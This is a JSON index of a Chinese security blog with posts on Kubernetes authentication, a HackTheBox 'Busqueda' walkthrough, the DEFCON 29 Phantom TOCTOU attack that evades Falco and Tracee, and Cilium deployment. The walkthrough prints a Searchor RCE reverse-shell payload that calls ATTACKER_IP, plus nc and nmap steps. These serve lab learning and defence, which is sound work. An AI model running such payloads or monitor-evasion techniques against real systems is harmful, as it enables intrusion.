[{"categories":null,"content":"最近在学习云原生最佳安全实践，其中提到了 k8s 中的认证与授权模块，为了加深理解以及有对 k8s 源码阅读的计划，便诞生了这个[✨探索系列]。我们将从需求出发看看为什么这个系统需要设计成这个样子，这个模块以及在源码层面是何如实现的，这样的实现有什么亮点以及工程考量，不仅如此，在这个过程中我们还会着重关注其中与安全相关的细节，关注系统的全貌，重现思考安全系统的构建。 🌠 我是谁？我能做什么？—— 认证与授权 认证和授权是计算机网络安全中的两个老生常谈的基本问题，它们都旨在确保只有授权用户才能访问受保护的资源。为了实现认证与授权机制，我们需要解决抛出两个问题让大家来思考一下：1）如何证明你（主体）的身份，2）如何确保你（主体）正在访问（行为）的资源（客体）是合法的？ 对于问题（1）如何证明你（主体）的身份，经典的解决思路有：a) 提供只有你知道的秘密（口令），b) 让一个Identity Provider第三方协助你证明你的身份（OAuth），对于问题（2）如何确保你正在访问的资源是合法的，解决思路是建立访问控制模型，典型的访问控制模型有，ACL(Access-Control-List), RBAC(Role-Based-Access-Control), ABAC(Attribute-Based-Access-Control)以及NGAC(Next-Generation-Access-Control)。 对于认证而言，为了达成一个优良的用户体验（不需要用户在进行操作时反复进行认证），在实践中往往需要实现一个可以在一个时间周期内向服务器证明自身并维持可信状态的机制，这种机制需要数据信息的支撑，根据数据信息存储位置的不同，我们可以将其分为服务器侧维护以及用户侧维护。 用户侧存储凭证维持机制：Basic Token（Base64编码username:password，在服务器侧校验凭证的合法性），Bearer Token(携带用户凭证作为数据载荷，通过签名算法实现防篡改），Client Certificate（客户侧证书，由可信目标CA签发，主体拥有私钥证明自身的合法性）。 解析后的JWT示例（Bearer Token） HEADER:ALGORITHM \u0026 TOKEN TYPE { \"alg\": \"RS256\", \"kid\": \"VsVyOVilN85xFdtqJZMMTlkqpQA_WZgLAfg51igPox8\" } PAYLOAD:DATA { \"aud\": [ \"https://kubernetes.default.svc.cluster.local\" ], \"exp\": 1667530848, \"iat\": 1667527248, \"iss\": \"https://kubernetes.default.svc.cluster.local\", \"kubernetes.io\": { \"namespace\": \"default\", \"serviceaccount\": { \"name\": \"cilium\", \"uid\": \"302b0155-6608-4b70-be4b-f7fb2bb73beb\" } }, \"nbf\": 1667527248, \"sub\": \"system:serviceaccount:default:cilium\" } 解析后的X509 Client Certificate示例， Version: 3 (0x02) Serial number: 1041774366814885730 (0x0e7520445e1bd762) Algorithm ID: SHA256withRSA Validity Not Before: 22/08/2023 03:12:59 (dd-mm-yyyy hh:mm:ss) (230822031259Z) Not After: 21/08/2024 03:18:00 (dd-mm-yyyy hh:mm:ss) (240821031800Z) Issuer CN = kubernetes Subject O = system:masters CN = kubernetes-admin Public Key Algorithm: RSA Length: 2048 bits Modulus: bf:a4:cf:72:34:07:a7:0c:4b:db:19:2a:f7:60:10:68: 8b:52:db:e9:3f:24:d5:05:c5:4b:c7:f5:04:1e:01:d4: 2a:e5:a5:59:4e:66:6f:25:eb:9f:1b:a5:91:81:28:18: 7f:a3:fd:36:c5:45:e5:ea:ef:18:a0:f8:61:1a:bc:6b: ee:d5:18:5e:3a:08:c0:11:d4:62:3c:40:18:6f:e6:56: 49:fe:01:5b:c5:56:f2:ab:4e:db:9f:96:4e:2f:e3:26: 56:39:4b:e8:08:7d:e3:9c:15:01:be:86:8b:ce:b4:8e: 7e:b7:1f:f9:98:4d:fc:13:7a:0a:f5:d1:bf:11:c7:4d: 11:41:d5:14:92:4a:3e:ef:c9:03:07:58:5a:49:31:df: c6:21:64:b6:5e:2e:1a:f8:da:4e:1a:7e:1b:7b:48:10: 9c:93:05:bd:a1:9e:f8:2c:75:0a:1a:4b:c6:1c:11:95: de:9a:7f:dd:12:9e:94:7a:68:07:4d:19:ed:fb:63:26: aa:a4:0a:71:81:83:a0:ad:94:e8:1e:7b:cc:dc:39:3c: ca:ae:bf:ba:50:57:37:87:a4:e9:b7:b1:1c:27:0a:18: 18:51:5c:55:28:87:0a:18:12:35:99:14:c4:10:53:37: 26:2d:fa:69:7e:b2:d8:8d:f1:dc:76:83:01:a7:81:e5 Exponent: 65537 (0x10001) Certificate Signature Algorithm: SHA256withRSA Signature: 92:d7:99:22:91:2f:f3:ef:38:25:b4:ad:ea:7d:2c:b7: a1:bb:cf:a4:eb:a0:f8:86:b9:ea:2b:e8:39:0e:0d:3c: 27:72:19:33:a1:69:e6:72:6b:f0:82:9e:f1:44:e6:0a: 1d:9b:55:58:e6:79:75:84:af:65:d2:5c:30:8d:1f:0e: 25:18:62:5a:9f:7e:0a:20:79:da:29:be:bc:16:3d:d2: 4e:fa:0f:13:c2:9a:5a:bb:98:32:55:ae:a3:bf:36:db: 00:fc:db:6a:ef:7e:09:f2:8a:aa:22:ca:90:db:b8:15: 70:5d:b2:1b:b6:b9:37:93:52:8c:d9:92:0f:38:97:bb: 93:c7:90:19:e7:c1:41:29:2f:7f:b8:02:03:07:43:47: 0a:6d:bb:f5:1f:e5:42:e2:22:19:6e:dc:e1:8e:fb:49: c2:43:69:1a:85:1e:9e:99:9e:e3:85:83:91:15:e3:9c: b8:17:7d:83:65:db:c8:03:ee:4a:1e:75:98:66:2f:e7: 86:40:ea:71:17:b8:34:bc:a4:b9:48:4b:1f:a3:42:c1: a2:e7:70:b7:0d:25:7d:af:16:40:63:49:fd:d1:85:67: 1f:2b:5a:4e:25:cc:b9:a6:99:4b:5c:03:c0:ad:3c:e8: 97:d1:6b:29:74:5e:5b:a0:99:f1:09:69:f9:d8:59:aa Extensions keyUsage CRITICAL: digitalSignature,keyEncipherment extKeyUsage : clientAuth basicConstraints CRITICAL: {} authorityKeyIdentifier : kid=d2003d36621e663f31e8b164d33f6dbf9433c371 服务器侧存储凭证维持机制：SessionID（不携带用户凭证，每一个ID绑定一个用户凭证并由服务器在后台进行管理）。 两者实现方法各有千秋，比如，使用Session ID需要在服务器端维护会话状态，而Bearer Token可以直接将与用户凭证相关的信息存储在客户端上，不需要服务器端进行会话管理，只需要在进行相关操作时对Token进行签名的校验，确认其合法性即可。 在本节初我们提到了合法这个词，这个词带有一点儿权威第三方下定义的定义的意味，我们姑且把这个权威第三方称作管理者。授权便是由管理者决定主体的哪些行为是合法的过程。 管理者提供对主体（用户）进行身份认证的机制并为其所管理的客体（资源）制定访问规则，确保只有满足规则之下的主体才能够对这些客体（资源）进行相关的行为操作。这样的规则一般由一个三元组组成，它们分别是主体","date":"2023-08-30","objectID":"/exploration-series-kubernetes-authenticationsa/:0:0","tags":["Kubernetes","Auth \u0026 Authz"],"title":"[✨Exploration Series] Kubernetes Authentications \u0026 Authorization Mechanismds","uri":"/exploration-series-kubernetes-authenticationsa/"},{"categories":null,"content":"👾 网络拓扑 TargetIP: 10.10.11.208 PrivateIP: 10.10.14.31 ","date":"2023-07-15","objectID":"/2023-07-16-hackthebox-busqueda/:0:1","tags":["RedTeam","Penetration Testing","HacktheBox"],"title":"HacktheBox 打靶之旅：busqueda","uri":"/2023-07-16-hackthebox-busqueda/"},{"categories":null,"content":"🏞️ 渗透环境搭建 Kali Linux In VM ","date":"2023-07-15","objectID":"/2023-07-16-hackthebox-busqueda/:0:2","tags":["RedTeam","Penetration Testing","HacktheBox"],"title":"HacktheBox 打靶之旅：busqueda","uri":"/2023-07-16-hackthebox-busqueda/"},{"categories":null,"content":"🧐 开始渗透！ 本期工具以及信息站点使用：nmap, chatGPT, Wappalyzer, hacktricks, docker Documentation, gtfobins 🔎 前期信息收集 我们当前的信息只有一个目标机器的IP地址，我们考虑使用Nmap对目标机器进行一个端口扫描以及服务探测以进行前期的信息收集过程。 nmap -p- --open -sS -n -Pn -oN nmap/busqueda 10.10.11.208 -p-: 这个选项指示Nmap扫描所有的端口号，而不仅仅是默认的一些常见端口。 --open: 这个选项告诉Nmap只显示开放的端口，即响应连接请求的端口。 -sS: 这个选项指定使用TCP SYN扫描方式，也称为半开放扫描。它发送一个SYN包到目标主机的每个扫描的端口，如果收到SYN/ACK响应，则表示该端口是开放的。 -n: 这个选项告诉Nmap禁用主机名解析，只使用IP地址进行扫描。 -Pn: 这个选项指示Nmap不要进行主机发现，即不检查目标主机是否在线。 扫描报告如下所示， Nmap scan report for 10.10.11.208 Host is up, received user-set (0.11s latency). Scanned at 2023-07-15 00:42:15 UTC for 27s Not shown: 56482 filtered ports, 9051 closed ports Reason: 56482 no-responses and 9051 resets Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 128 80/tcp open http syn-ack ttl 128 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 26.96 seconds Raw packets sent: 131073 (5.767MB) | Rcvd: 16926 (677.048KB) 可以看到目标机器上开放了22,80端口，我们需要更进一步的探测其上运行服务的信息，使用如下nmap命令， nmap -p22,80 -sC -sV 10.10.11.208 -p22,80: 这个选项指定了要扫描的端口号。在这个例子中，它指定了扫描22和80两个端口。 -sC: 这个选项启用了Nmap的默认脚本扫描。它会在扫描中应用一些常见的脚本来探测目标主机的漏洞或配置问题。 -sV: 这个选项启用了版本探测功能，它会尝试确定目标主机上运行的服务和应用程序的版本信息。 扫描报告如下所示， Starting Nmap 7.80 ( https://nmap.org ) at 2023-07-15 00:47 UTC Nmap scan report for 10.10.11.208 Host is up (0.061s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.52 |_http-server-header: Apache/2.4.52 (Ubuntu) |_http-title: Did not follow redirect to http://searcher.htb/ Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 13.28 seconds 在这一份报告中我们得到了开放端口上运行服务的版本信息, 22/tcp: OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) 80/tcp: Apache httpd 2.4.52 http-server-header: Apache/2.4.52 (Ubuntu) http-title: Did not follow redirect to http://searcher.htb/ 将searcher.htb与 10.10.11.208(TargetIP) 的映射添加到 /etc/hosts 文件中，添加后的文件应该有如下一行 10.10.11.208 searcher.htb /etc/hosts文件是一个在Unix和类Unix系统中常见的文本文件，它用于将主机名映射到IP地址。这个文件可以用来在本地系统上设置静态的主机名解析，而不需要依赖DNS服务器。 🎋 一探究竟：访问目标站点 访问目标站点(http://searcher.htb)看看它的葫芦里卖的是什么药🙂， Target Website\" Target Website 简单体验了下这个站点的功能，其实现了一个类似于聚合搜索引擎，用户可以选择他们偏好的主流搜索引擎进行信息检索。 我们可以通过Wappalyzer简单了解一下该站点使用了什么Web框架进行构建， WebTech Information\" WebTech Information 在页面最后的站点版权信息中我们可以看到该站点所使用到的技术包括Flask框架以及Searchor 2.4.0 🔫 攻击开始！ 第一阶段：获得普通用户权限 Google Hacking时间，看看相关框架有没有已知的nday以及PoC可供我们利用。经过一番搜索后发现Searchor 2.40存在RCE漏洞！ Searchor Exploit PoC\" Searchor Exploit PoC 其中的payload如下所示， ', exec(\"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ATTACKER_IP',PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);\"))# 使用nc在本地监听8080端口等待受害机器回弹shell， nc -lnvp 8080 -l: 这个选项告诉nc工具要监听（listen）连接，即等待其他主机连接到指定的端口。 -n: 这个选项禁用主机名解析，只使用IP地址进行通信。 -v: 这个选项启用详细输出模式，打印更多的调试信息。 -p 8080: 这个选项指定要监听的端口号，这里是8080。 （这里免去了使用burpsuite的必要，直接向输入框中键入payload即可），最终我们在控制服务器上获得了受害机器回弹的shell，用户是svc。我们在 /home/svc 目录下找到了user.txt，获得了我们在普通用户权限下的第一个FLAG！Well Done！ 第二阶段：获得root用户权限 我们以svc用户身份在文件系统中闲逛，搜索潜在的敏感信息以为后续的提权工作搜集信息。一些敏感的目录、文件包括：目标站点运行的工作目录，/etc/passwd，.git，.ssh，数据库文件，日志文件等。 在 /home/svc 目录下我们发现了用户的 .gitconfig 文件，其中的内容如下所示， [user] email = cody@searcher.htb name = cody [core] hooksPath = no-hooks [safe] directory = /var/www/app 继续跟踪相关的目录，在 /var/www/app 目录下我们发现了 .git 目录， .git directory\" .git directory 其中存在config文件，内容如下， git config\" git config 这其中包含了以下信息： cody用户的身份认证信息 目标站点的子域名gitea.searcher.htb上运行着gitea服务 我们使用获得的身份认证信息通过ssh连入目标机器上进行后续的工作， ssh cody@searcher.htb 将 gitea.searcher.htb 加入 /etc/hosts 文件，现在你可以看到文件中有这样一条记录 10.10.11.208 searcher.htb gitea.searcher.htb 按照Checklist中的项目进行可利用提权入口进行检查， https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist Can yo","date":"2023-07-15","objectID":"/2023-07-16-hackthebox-busqueda/:0:3","tags":["RedTeam","Penetration Testing","HacktheBox"],"title":"HacktheBox 打靶之旅：busqueda","uri":"/2023-07-16-hackthebox-busqueda/"},{"categories":null,"content":"📖 总结复盘 我是如何获得该站点服务器上的普通用户权限的？ 通过站点使用的具有漏洞的组件实现nday RCE漏洞利用。 我是如何发现漏洞点的？ 站点上暴露了所使用组件的版本信息，通过公开数据库可以查询到对应组件的对应版本时候存在相关的漏洞，实现打靶第一步。 如何进行进一步提权的？ 提权的方式可以千奇百怪、脑洞大开（但也可以遵循一定的Checklist来确保自己的机器是安全的）但大多数时候都是因为人员的疏忽导致的。以本靶机为例，cody用户能够执行的sudo的操作仅有一条并且原意是让其在 /opt/scripts 的目录中执行，但其忽略了对文件路径进行相关的限制，致使攻击者能够在任意可以进行写操作的目录中构造恶意脚本，并成功以root身份执行，最终实现提权。 如何进行安全加固? 避免使用不安全的组件或依赖，在系统上线前可以通过各种类型的扫描工具(SAST, DAST, IAST…)在业务上线前确保没有中、高危漏洞存在 生产环境中部署服务的环境尽可能的精简，除服务正常运行所需的文件以外不应该存在任何其它的文件数据，更不能将高权限用户的身份凭证直接存放于生产环境之中 口令不可重复使用，重复使用的口令意味着当该口令泄露时所有与此相关的服务都存在失陷的风险 对于运维管理所必须存在的普通账户来说，需要严格限制其能够使用sudo的场景，对相关的参数进行过滤限制，必要时限制其能够登入的网络地址。 ","date":"2023-07-15","objectID":"/2023-07-16-hackthebox-busqueda/:0:4","tags":["RedTeam","Penetration Testing","HacktheBox"],"title":"HacktheBox 打靶之旅：busqueda","uri":"/2023-07-16-hackthebox-busqueda/"},{"categories":null,"content":"背景知识 在第 29 届的 DEFCON 会议上，来自 Lacework 的 Rex Guo 与 LinkedIn 的 Junyuan Zeng 分享了以他们关于利用内核从用户态拷贝数据到内核态的过程中，由于某些 Runtime Security 产品选择了不合适的 Probes 插入位置，存在 TOCTOU 问题，进而能够欺骗探针，绕过 Runtime Security 产品的 Policy Enforcement，进而达成攻击者进行恶意活动的目的。 另外，分享者还介绍了 Semantic confusion，一种利用内核与跟踪程序对数据语义解释的歧义实现的攻击方式，这与在 Usenix Security'22 会议上获得最佳论文奖的 Identity Confusion in WebView-based Mobile App-in-app Ecosystems 有异曲同工之妙，有兴趣的读者可以自行查阅欣赏。 在这次分享中，他们提到了两个具有漏洞的开源项目，一个是云原生 Runtime Security 项目 Falco，它同时也是 CNCF 的孵化项目，另一个则是我们之前有介绍过的 Tracee。 这两个项目实现都不同程度的受到 TOCTOU 问题的影响，存在漏洞被利用的风险。在介绍具体的漏洞利用细节前，我们先来看看什么是 TOCTOU，以及这两个项目最主要的功能实现。 Time-Of-Check Time-Of-Use (TOCTOU) 在维基百科中对 TOCTOU 问题的定义如下， TOCTOU In software development, time-of-check to time-of-use (TOCTOU, TOCTTOU or TOC/TOU) is a class of software bugs caused by a race condition involving the checking of the state of a part of a system (such as a security credential) and the use of the results of that check. 简单来说 TOCTOU 问题利用了当前 Multi-threads 或 Multi-cores 机器上指令执行序不确定的现象外加不正确的编码所引起的 Race condition，从而当对软件系统的某一部分的状态进行检查并通过后，操作系统可能并不会马上让当前进程继续执行后续的指令流程（使用经过检查的对象），而是调度其它的任务去干一些其它的事情（当然，这种情况也可能不发生，原先的任务可以一直执行下去，直至分配给其的时间片被消耗殆尽）。当操作系统调度我们具有 TOCTOU 问题的进程在 CPU 上运行时，先前通过检查的对象已经被悄悄的修改。从全局上看，安全上下文语义已经发生了变化，操作系统拿着这个被“掉包”的对象进行后续的操作，从而可能会引入一定的安全风险。 我们可以发现在对系统状态进行检查与使用该经过检查的对象之间存在一定的时间窗口，这个时间窗口的长度决定了我们进行 TOCTOU 攻击时成功的概率。我们需要有办法让当前进程在执行完检查系统状态的指令后让出 CPU （时间窗口的左端点），并且引入另外一个线程对相关的对象进行修改，最终在回到原指令序列时以被替换后的对象执行后续的任务（时间窗口的右端点）。 TOCTOU Overview\" TOCTOU Overview 到这里，我们可以发现要想成功利用一次 TOCTOU， 需要集齐以下要素， 需要有办法让执行当前任务的进程挂起 需要有一个协助线程能够访问目标对象的内存空间，改变目标对象的状态 需要让 TOCTOU 窗口足够大以确保我们能够在进程恢复前完成修改目标对象的任务（进程调度是操作系统的任务，用户一般无法干预/预测一个进程在什么时间点执行，我们能够知道的是这个进程在就绪状态下会被执行，至于具体的细节由操作系统决定，这也导致 TOCTOU 的利用不一定是 100% 成功的，当然在有利条件下也是能够达成 100% 成功） Runtime Security Products Falco 和 Tracee 一样，都可以归属与 Runtime Security 产品类别，主要实现的功能为：1）在运行时环境中、内核层面解析 Linux 系统调用，将其转换为具有安全上下文语义的结构化数据；2）使用规则检测引擎根据用户自定义的规则在捕获器产生的事件流中发现违背规则的事件，并产生告警； Falco 和 Tracee 实现上述功能的原理都是通过在关键内核函数或跟踪点上 Hook 住探针来达到对进程执行在操作系统内核层面行为的监测，其需要与内核相关函数以及相关事件执行流程进行关联来确定安全上下文语义，进而对进程执行流程进行画像，从而找到异常的行为事件，确保运行时安全。 有关 Tracee 的介绍可以查看本博客的这篇文章。 差异 Runtime Security 产品的差异可以在几个维度上给予考虑：1）用户自定义规则上的语义丰富程度；2）规则检测引擎的性能；3）可提供安全事件的覆盖范围以及安全上下文语义的丰富程度；4）与其它安全产品或平台的联动支持程度； 需要注意的是，他们都只是对相关的异常行为进行告警，并不会有什么主动的动作，也就是说上述两者并没有阻断进程异常行为的能力，在本篇文章的末尾我将会简要探讨一下 eBPF LSM 在弥补这一方面不足的能力。 ","date":"2022-10-14","objectID":"/2022-10-15-phantom-attack-zh.cn/:0:1","tags":["eBPF","TOCTOU","Clound Native Security","Malicious Behaviour Monitoring","DEFCON 29","Conference Sharing"],"title":"Phantom Attack: Evading System Call Monitoring (TOCTOU Problem)","uri":"/2022-10-15-phantom-attack-zh.cn/"},{"categories":null,"content":"漏洞描述 该漏洞被编号为 CVE-2021-33505 ，官方对其描述如下所示， Description A local malicious user can circumvent the Falco detection engine through 0.28.1 by running a program that alters arguments of system calls being executed. 该漏洞可以欺骗 Falco 规则引擎的检测（实际上，在数据采集阶段获取的信息在全局的视角来看已经是不准确的了，内核执行的相关操作已与采集器捕获到的数据无关，也就不能表征进程的行为，给出有用的安全建议了），执行规则本不允许的操作而不产生告警信息。 TOCTOU 在内核观测中 在两位研究者的分享中，以 openat 系统调用为例，介绍了在有内核探针的环境下 TOCTOU 的利用。 openat 系统调用入口\" openat 系统调用入口 当应用程序需要调用 openat 系统调用完成其工作时，将会陷入内核完成相应的逻辑处理流程，首先便是 trace_sys_enter 入口，内核探针可以 Attach 到 raw_syscalls/sys_enter 处，每当操作系统陷入内核进行系统调用时都会触发相应的探针程序，完成相应的用户处理逻辑。在本文中，Runtime Security 可以在此获得相关系统调用的入参以及进程上下文环境。 接着，根据具体执行的系统调用和硬件平台查找 Syscall Table（在此处是 openat）调用相应的内核处理函数（在此处是 do_sys_open）完成相应的任务，最后调用 trace_sys_exit 函数结束系统调用，最后返回应用程序空间。若有任何内核探针被挂载到 trace_sys_exit 上，其也会在 trace_sys_exit 函数被调用时执行。 利用 eBPF 编写 Tracing 类程序可以简单参考本博客中的这篇文章。 在不同位置引入 Probe\" 在不同位置引入 Probe 上图考虑的是 Tracing Program 在不同的内核位置 Hook 探针，主要考虑在（1）trace_sys_enter raw_tracepoints 入口处，以及 （2）在 do_sys_open 执行具体 openat 系统调用处。 当内核执行到这些被 Hook 住的函数时，会触发用户挂载的自定义处理程序（比如 eBPF 程序），执行相应的处理逻辑。比如，在 Tracce 中定义了两种 Probes， SysEnter: \u0026traceProbe{ eventName: \"raw_syscalls:sys_enter\", probeType: rawTracepoint, programName: \"trace_sys_enter\"}, SyscallEnter__Internal: \u0026traceProbe{ eventName: \"raw_syscalls:sys_enter\", probeType: rawTracepoint, programName: \"tracepoint__raw_syscalls__sys_enter\"}, 它们对应的内核态 eBPF 程序如下所示， SEC(\"raw_tracepoint/trace_sys_enter\") int trace_sys_enter(struct bpf_raw_tracepoint_args *ctx) { event_data_t data = {}; if (!init_event_data(\u0026data, ctx)) return 0; if (!should_trace(\u0026data)) return 0; // always submit since this won't be attached otherwise int id = ctx-\u003eargs[1]; struct task_struct *task = (struct task_struct *) bpf_get_current_task(); if (is_compat(task)) { // Translate 32bit syscalls to 64bit syscalls, so we can send to the correct handler u32 *id_64 = bpf_map_lookup_elem(\u0026sys_32_to_64_map, \u0026id); if (id_64 == 0) return 0; id = *id_64; } save_to_submit_buf(\u0026data, (void *) \u0026id, sizeof(int), 0); events_perf_submit(\u0026data, RAW_SYS_ENTER, 0); return 0; } SEC(\"raw_tracepoint/sys_enter\") int tracepoint__raw_syscalls__sys_enter(struct bpf_raw_tracepoint_args *ctx) { struct task_struct *task = (struct task_struct *) bpf_get_current_task(); int id = ctx-\u003eargs[1]; if (is_compat(task)) { // Translate 32bit syscalls to 64bit syscalls, so we can send to the correct handler u32 *id_64 = bpf_map_lookup_elem(\u0026sys_32_to_64_map, \u0026id); if (id_64 == 0) return 0; id = *id_64; } bpf_tail_call(ctx, \u0026sys_enter_init_tail, id); return 0; } 不过，trace_sys_enter 在通常情况下并不会默认挂载到指定的 tracepoint 上，只有当显式指定 Tracing Arguments 中包含 sys_enter 事件时才会被挂载。在 Tracee 中使用 tracepoint__raw_syscalls__sys_enter 跟踪系统调用，并通过 tail call 完成事件的解析与上报。 回到上图跟踪 openat 系统调用的例子，为了更好的说明，我们需要知道 openat 系统调用的函数签名， int openat(int dirfd, const char *pathname, int flags, mode_t mode); 其中，第二个参数是一个指向用户空间内存的指针，其中存放的是进行系统调用时，应用传入的想要打开文件的路径。在 do_sys_open 函数中，内核通过 getname 函数将用户空间的数据复制到内核缓冲区中，并在后续调用 do_filp_open 传入相关待打开文件的路径参数，完成 openat 系统调用的主要逻辑。 我们可以以 getname 函数为界，将该代码段分为 CP-1 和 CP-2 两部分。在 CP-1 中，filename 数据存放于用户空间内存，位于用户空间的攻击者可以修改存放 filename 数据的内存，进而在内核拷贝/使用相关数据时（TOU）传入的是攻击者篡改的恶意路径。 我们若考虑在 CP-1 函数中 Hook 探针有这么两个选择：1）使用 raw_tracepoints 在 trace_sys_enter 上 Hook 探针，2）使用 kprobe 在 do_sys_open 上 Hook 探针；由于这两个函数的入参指向的都是位于用户空间的内存，攻击者能够在通过探针的检查后，在程序控制流执行到 getname 函数前，修改相关内存位置的 filename 数据，欺骗 Tracing Program，达到进行恶意行为，避免产生安全告警的目的。这两个 Hook Points 也就是我们所说的 TOC 部分，其中探针获取到的数据在全局来看是不可靠的。 在 CP-2 中，由于位于用户空间侧的数据已经被拷贝进入了内核缓冲区，其能够避免位于用户空间侧攻击者对数据的篡改。若我们此时选择 do_filp_open 函数作为 Tracing Program 的 Hook 点，我们就能够确保内核执行文件打开逻辑所使用的参数与我观测程序所“看到”的参数是一致的。（我们在这做的就是将观测点尽可能的靠近内核进行主要操作逻辑的部分） 需要注意的是，若 Hook 点选择在 trace_sys_exit 上，其仍然会受到 TOCTOU 问题的影响，因为其传入的参数与 trace_sys_enter 中的参数是一致的。 Phantom v1 Exploit Plan 研究者给出了他们利用 TOCTOU 问题对 Falco 进行 Exploit 的计划，具体可以划分为以下几个环节， 使用恶意参数触发目标系统调用 让内核从用户空间中读取恶意参数并且执行攻击者预想的恶意行为 使用合法的参数覆写用户内存空间指针指向的数据结构 在调用 sys_exit 准备结束一次系统调用的时候，tracing program 读取用户空间指针指向的数据结构并且通过规则引擎的检测 为了实现上述这些目标需要面临如下挑战， 内核线程什么时候会读取用户传入的参数？ 我们如何同步覆写与内核线程读行为？（确保覆写完成后，内核线程读取","date":"2022-10-14","objectID":"/2022-10-15-phantom-attack-zh.cn/:0:2","tags":["eBPF","TOCTOU","Clound Native Security","Malicious Behaviour Monitoring","DEFCON 29","Conference Sharing"],"title":"Phantom Attack: Evading System Call Monitoring (TOCTOU Problem)","uri":"/2022-10-15-phantom-attack-zh.cn/"},{"categories":null,"content":"🤔进一步研究 在介绍整个 Phantom Attack v1 的过程中，我们不难发现整个攻击链路的关键点在于设计的 tracing program 选择了什么函数作为跟踪的 Hook 点 ，若选择的 Hook 点读取的数据来自于用户空间侧，其就存在被篡改的风险，若选择的 Hook 点使用的是已经位于内核侧的数据作为入参，其存在被篡改的可能性就小，tracing program 获得到的数据也就更加可信。在内核中有以 security_xxxx 命名的函数，这些函数所处的路径可以认为是安全的，hook 到这些函数的 kprobe 可以信任它们从中获得的数据。 并且我们发现这些 Runtime Security 产品并没有能够对异常行为进行阻断的能力，它们能够做的事情是：发生正在进行的异常行为，并将与该行为相关的上下文信息尽可能多的展示给安全运维人员，用作事后审计或有人员实时对相关异常行为进行研判处理。 为了让运行时安全产品获得阻断异常行为的能力，可供选择的解决方案之中赫然屹立着 LSM BPF 这种令人耳目一新的解决方案，后续随着进一步的学习，笔者也会写写这方面有关的学习笔记。 ","date":"2022-10-14","objectID":"/2022-10-15-phantom-attack-zh.cn/:0:3","tags":["eBPF","TOCTOU","Clound Native Security","Malicious Behaviour Monitoring","DEFCON 29","Conference Sharing"],"title":"Phantom Attack: Evading System Call Monitoring (TOCTOU Problem)","uri":"/2022-10-15-phantom-attack-zh.cn/"},{"categories":null,"content":"References DEF CON 29 - Rex Guo, Junyuan Zeng - Phantom Attack: Evading System Call Monitoring LSM BPF Change Everything - Leonardo Di Donato, Elastic \u0026 KP Singh, Google ","date":"2022-10-14","objectID":"/2022-10-15-phantom-attack-zh.cn/:0:4","tags":["eBPF","TOCTOU","Clound Native Security","Malicious Behaviour Monitoring","DEFCON 29","Conference Sharing"],"title":"Phantom Attack: Evading System Call Monitoring (TOCTOU Problem)","uri":"/2022-10-15-phantom-attack-zh.cn/"},{"categories":null,"content":"关于笔者 目前，笔者还是一名在校大学生，就读于信息安全专业，对云原生安全、分布式系统、观测领域有较大的兴趣。因而小站上的很多文章都是萌新学习踩坑的经验分享，更多的是“玩”的心态向优秀、有趣的项目，学习其设计思路、编码风格、文档编写、开源社区/团队协作方面的知识，并辅以自己小小的见解。作为一名还未有充分经验的用户，文章中难免有所纰漏，还望能够与大家交流学习，共勉。 ","date":"2022-09-27","objectID":"/2022-09-28-%E5%9C%A8k8s%E9%9B%86%E7%BE%A4%E4%B8%8A%E9%83%A8%E7%BD%B2cilium%E4%B8%8Ehubble/:0:0","tags":["eBPF","kubernetes","cilium"],"title":"在 K8s 集群上部署 Cilium 与 Hubble","uri":"/2022-09-28-%E5%9C%A8k8s%E9%9B%86%E7%BE%A4%E4%B8%8A%E9%83%A8%E7%BD%B2cilium%E4%B8%8Ehubble/"},{"categories":null,"content":"在 K8s 集群上部署 Cilium 与 Hubble 近段时间一直在思考与研究云原生中应用的网络、性能与行为监控/控制平台，Cilium 作为 CNCF 中的后起之秀，利用eBPF 提供对于内核行为观测的强大能力，实现了 K8s 集群工作负载的网络、可观测性以及安全，它的实现方式以及架构思路给了我极大的启发。下图给出了 Cilium 的基本架构， Cilium 基本架构\" Cilium 基本架构 使用 Kind 部署 K8s 集群 我们有三种方式去创建 K8s 集群，在这里我们仅作为一个 demo 来去对 Cilium 进行考察，因此我们选择使用最简单的方式去部署 K8s 集群，它为我们免去了许多对集群繁琐的配置，皆在帮助开发者快速的搭建一个集群，并通过这个简易集群来测试自己的云原生应用。想要详细了解 Kind 的可以点击此处，我们这里仅使用其进行快速集群创建。 在 Cilium 的官方文档中给出了使用 Kind 来创建集群所使用的命令，我们会跟随着文档来一步步的创建使用 Cilium 作为 CNI 组件的 K8s 集群。 鉴于国内特殊的网络环境情况，在创建集群或在 apply yaml 的时候会出现很多因网络问题导致的错误，这里也会给出笔者自己摸索出来的解决方案，这可能不是最好的解决方案但是它可行。😊 我们直接复制 Cilium 文档中给出的命令，使用 Kind 创建 K8s 集群， curl -LO https://raw.githubusercontent.com/cilium/cilium/1.12.0/Documentation/gettingstarted/kind-config.yaml kind create cluster --config=kind-config.yaml 稍微看一下用户创建集群的 yaml 文件配置， kind:ClusterapiVersion:kind.x-k8s.io/v1alpha4nodes:- role:control-plane- role:worker- role:worker- role:workernetworking:disableDefaultCNI:true 你可以根据需要和机器性能增添或删减工作节点的数量，笔者在这里便使用官方给出的定义。在我们执行第二条命令后 kind 会使用 docker 拉取对应的镜像，但 kind 中并不会显示拉取的进度，你可以自行使用 docker pull 拉取对应版本的 kind 镜像并确认你的网络环境是否能够访问对应的仓库。 值得一提的是，在我们创建的 k8s 集群中，默认的 CNI 插件已经被 disable，我们在下一步中安装的 Cilium 会提供相应的 CNI 实现。 若一切的顺利执行，你的 K8s 集群便会被顺利创建，你可以使用 kubectl cluster-info 查看你的集群是否已成功部署， kubectl cluster-info 命令执行情况\" kubectl cluster-info 命令执行情况 使用 docker ps 命令查看在本地机器上已经启动了的工作节点以及控制平面， docker ps 